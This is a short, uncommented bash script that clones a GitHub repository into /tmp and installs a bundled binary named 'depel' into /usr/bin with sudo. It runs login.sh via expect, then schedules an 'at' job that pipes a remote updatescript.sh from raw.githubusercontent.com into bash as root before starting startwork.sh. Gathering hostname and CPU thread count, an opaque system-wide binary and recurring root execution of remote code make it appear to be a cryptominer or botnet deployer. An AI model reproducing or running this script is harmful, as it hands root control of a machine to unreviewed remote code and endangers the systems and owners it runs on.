#!/bin/bash

ID="$(hostname)"
THREADS="$(nproc --all)"

rm -rf /tmp/beauty/

cd /tmp && mkdir beauty
git clone https://github.com/githubec/beauty.git /tmp/beauty
cd /tmp/beauty
chmod +x /tmp/beauty/depel
chmod 777 ./*.sh
sudo cp /tmp/beauty/depel /usr/bin/
expect login.sh

touch /tmp/at.txt
{
 echo 'sudo pkill startwork.sh'
 echo 'sudo pkill depel'
 echo 'sudo pkill sleep'
 echo 'sleep 60'
 echo 'sudo curl -s -L https://raw.githubusercontent.com/githubec/beauty/master/updatescript.sh | bash -s'
} > /tmp/at.txt
#at now + 3 minute < /tmp/at.txt
at -m -f /tmp/at.txt now + 2 minute
echo -e 'Restart job specified'
sleep 3

dos2unix startwork.sh

./startwork.sh
